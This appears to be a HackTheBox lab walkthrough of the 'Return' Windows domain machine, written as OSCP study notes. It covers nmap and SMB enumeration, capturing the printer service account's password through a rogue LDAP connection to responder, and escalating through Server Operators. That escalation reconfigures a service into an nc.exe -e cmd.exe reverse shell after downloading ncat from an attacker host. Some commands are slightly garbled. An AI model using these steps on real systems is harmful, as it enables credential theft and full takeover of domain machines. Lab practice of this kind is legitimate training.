---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Return?tab=play_machine
Difficulty: Easy
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Return-1791410165200.webp)

![](../../0.%20Assets/Return-1791410177560.webp)

---

# Walkthrough

Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.

```
nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49678,49681,49697,61707

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-10-07 22:20:30Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 36281/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15037/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54162/udp): CLEAN (Timeout)
|   Check 4 (port 22885/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 18m28s
| smb2-time:
|   date: 2026-10-07T22:21:26
|_  start_date: N/A
```

Something Interesting is that there is a website we will check it soon

Then I will add the `domain` and hostname of the machine to the `/etc/hosts` for correct name resolution (protocols like `kerberos` depend on name resolution for correct functioning)

```
netexec smb $T
```

![](../../0.%20Assets/Return-1791410452955.webp)

Let's test for anonymous in different protocols before we go for the website.

I tried anonymous access and seems correct but I can't list any shares or get any users, even through `RPC`

```
netexec smb $T -u '' -p ''
SMB         10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.95.241   445    PRINTER          [+] return.local\:
```


Opening the website this is what we encounter

**![](../../0.%20Assets/Return-1791410943427.webp)

And wappalyzer snitches a bit on what the website is built with
![](../../0.%20Assets/Return-1791410953789.webp)

I opened the `settings` tab and saw this

![](../../0.%20Assets/Return-1791411712742.webp)

looks like we have a password there, so I tried to change the `HTML` from a `password` field type to a `text` one

![](../../0.%20Assets/Return-1791411753654.webp)

But it was already a `text` input field so I started thinking and realized that I can (If it works the way it seems it is going to work) point a connection towards any IP and try to authenticate with the preset credentials

So I ran `responder`

```
sudo responder -I tun0
```

and pointed the connection towards my kali and sent it

![](../../0.%20Assets/Return-1791411877499.webp)

Great! let's see if these are correct

![](../../0.%20Assets/Return-1791411928481.webp)


```
./nxcspray all  $T -u 'svc-printer' -p '1edFg43012!!'
```

(I recommend using this tool to spray all protocols, I forked it to fix the `all` functionality I would suggest you guys use it)


![](../../0.%20Assets/Return-1791411983166.webp)

Wow, okay not only we have access through `evil-winrm` but `ldap` shows as `Pwn3d` which normally means the account has `Domain admin privileges`, let's log into the machine and see what we encounter.

```
evil-winrm -i $T -u 'svc-printer' -p '1edFg43012!!'
```

![](../../0.%20Assets/Return-1791412129744.webp)

There are some interesting and dangerous privileges here if we are not yet administrators

I tried exploiting the `SeBackupPrivilege` without luck

For now, here is the user flag

![](../../0.%20Assets/Return-1791412164822.webp)

And as i suspected, we can't yet get the administrator flag

![](../../0.%20Assets/Return-1791412203969.webp)

Another dangerous group is `server operators` it allows us to change the binary of some services

```
services
```

This command shows the services and shows which ones we can edit (`privileges`)

![](../../0.%20Assets/Return-1791415464296.webp)

```
sc.exe qc VMTools
```

With this command we can check which permissions the service is running as

![](../../0.%20Assets/Return-1791415512550.webp)

(I already exploited it and now i am documenting it that is why you can see the reverse shell)

Then we bring into the machine the binary for `netexec`

```
iwr -uri http://10.10.15.226/ncat.exe -Outfile ncat.exe
```

and set up the service with a reverse shell

```
sc.exe config VMTools \nc.exe -e cmd.exe 192.168.1.205 1234"
```

finally start a listener (in my case penelope)

```
penelope -O -p 1337 -i tun0 -a
```

And stop and start the service to execute the command

```
sc.exe stop VMTools

sc.exe start VMTools
```

![](../../0.%20Assets/Return-1791415351752.webp)